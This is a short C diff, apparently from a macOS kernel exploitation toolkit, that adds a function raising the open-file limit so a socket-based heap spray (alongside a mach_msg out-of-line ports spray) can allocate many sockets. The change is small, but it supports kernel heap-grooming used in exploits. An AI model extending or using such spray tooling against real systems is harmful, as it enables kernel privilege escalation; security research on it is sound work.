@@ -12,9 +12,25 @@
 #include <errno.h>
 #include <unistd.h>
 #include <sys/socket.h>
+#include <sys/resource.h>
 #include <netinet/in.h>
 
 #include <mach/mach.h>
+
+/* macOS defaults to a 256-fd soft limit; large socket sprays need more. */
+static void
+raise_nofile_limit(void)
+{
+    struct rlimit rl;
+
+    if (getrlimit(RLIMIT_NOFILE, &rl) != 0)
+        return;
+    if (rl.rlim_cur >= 10240)
+        return;
+    rl.rlim_cur = (rl.rlim_max == RLIM_INFINITY || rl.rlim_max > 10240)
+                  ? 10240 : rl.rlim_max;
+    setrlimit(RLIMIT_NOFILE, &rl);
+}
 
 /* ------------------------------------------------------------------ */
 /* (a) mach_msg OOL-ports spray                                       */
@@ -162,6 +178,7 @@ inpcb_spray_start(int n_sockets)
     s = calloc(1, sizeof(*s));
     if (s == NULL)
         return NULL;
+    raise_nofile_limit();
     s->fds = malloc((size_t)n_sockets * sizeof(int));
     if (s->fds == NULL) {
         free(s);
